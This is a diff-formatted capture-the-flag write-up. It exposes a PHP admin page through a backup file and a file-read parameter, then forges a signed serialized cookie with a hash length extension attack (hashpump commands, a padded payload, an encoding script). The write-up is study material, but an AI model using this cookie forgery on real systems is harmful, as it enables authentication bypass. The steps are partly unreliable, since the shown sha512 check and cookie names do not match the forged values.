@@ -1,0 +1,69 @@
+I open the url  and I check the source code nothing found
+
+so i check for a backup file i found index.php~
+
+so I read the source and i found that i can read the content of files from index.php
+
+so
+
+http://web.msspctf.info/web5/index.php?useme=
+
+I tried the commun urls like " admin.php, config.php , home.php"
+
+but i was able to load only the admin.php source code
+ 
+<?php
+  #Serious things begin now good luck :).
+  require_once("config.php");
+  $passme = false;
+  if (isset($_COOKIE["is_admin"])) 
+  {
+    $pass = $_COOKIE["is_admin"];
+     $passme = unserialize($pass);
+     $signature = $_COOKIE["mac"];
+     if ($signature !== hash("sha512", $SHAREDSEC . strrev($pass))) $passme = false;
+  }
+  else 
+  {
+    $passme = false;
+    $serial = serialize($passme);
+    setcookie("is_admin", $serial);
+    setcookie("mac", hash("sha512", $SHAREDSEC . strrev($serial)));
+  }
+  if ($passme) 
+  {
+       echo "Congrats!! ".$FLAG;
+  }
+  else echo '<img src="troll.jpg" alt="">';
+?>
+
+
+Step 1 : 
+root@bt:~/Hspp# ./hashpump -d ";0:b" -a ";1:b" -s ef16c2bffbcf0b7567217f292f9c2a9a50885e01e002fa34db34c0bb916ed5c3 -k 6
+d1f264671df81a7cd03d255e04459cbe419bccac0d651ba2d512f93ca8d38201
+
+0:b\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00`;1:b
+
+
+Step 2 : 
+<?php
+print urlencode(strrev(";0:b\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00`;1:b"));
+?>
+
+Step 3 :
+root@bt:~/Desktop# php conv.php 
+
+b%3A1%3BP%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80b%3A0%3B
+
+
+
+Step 4 : Insert As Cookies 
+
+hash = d1f264671df81a7cd03d255e04459cbe419bccac0d651ba2d512f93ca8d38201
+
+
+auth = b%3A1%3BP%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80b%3A0%3B
+
+
+And you Get the Flag
+
